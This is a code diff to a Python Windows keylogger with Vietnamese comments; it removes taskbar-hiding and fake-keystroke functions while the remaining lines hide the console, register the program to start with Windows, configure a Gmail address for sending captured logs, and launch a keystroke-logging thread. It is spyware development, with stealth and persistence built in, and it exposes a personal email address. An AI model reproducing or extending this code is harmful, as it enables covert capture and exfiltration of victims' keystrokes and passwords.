@@ -6,24 +6,12 @@ import time
 import ctypes
 import os
 import winreg
-import win32api
-import win32con
-import win32gui
 import threading
 
 # Ẩn cửa sổ console (chỉ áp dụng cho Windows)
 def hide_console():
     if os.name == 'nt':
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-
-# Ẩn icon khỏi Taskbar
-def hide_taskbar_icon():
-    try:
-        hwnd = win32api.GetConsoleWindow()
-        if hwnd:
-            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
-    except Exception as e:
-        log_error(f"Failed to hide taskbar icon: {e}")
 
 # Cấu hình email
 EMAIL_ADDRESS = "nguyenhoangngoc22062003@gmail.com"  # Địa chỉ email của bạn
@@ -116,18 +104,6 @@ def monitor_log_file():
         except Exception as e:
             log_error(f"Failed to monitor log file: {e}")
 
-# Hàm tạo sự kiện giả mạo
-def create_fake_events():
-    try:
-        # Tạo sự kiện nhấn phím giả
-        for key in [win32con.VK_RETURN, win32con.VK_SPACE, win32con.VK_TAB]:
-            win32api.keybd_event(key, 0, win32con.KEYEVENTF_SCANCODE, 0)
-            time.sleep(0.1)
-            win32api.keybd_event(key, 0, win32con.KEYEVENTF_KEYUP, 0)
-        print("Fake events generated successfully.")
-    except Exception as e:
-        log_error(f"Failed to create fake events: {e}")
-
 # Hàm khởi động listener
 def start_keylogger():
     try:
@@ -139,7 +115,5 @@ def start_keylogger():
 
 if __name__ == "__main__":
     hide_console()  # Ẩn cửa sổ console khi chạy
-    hide_taskbar_icon()  # Ẩn icon khỏi Taskbar
     add_to_registry()  # Đăng ký để tự khởi động cùng hệ thống
     threading.Thread(target=start_keylogger).start()
-    create_fake_events()  # Tạo sự kiện giả
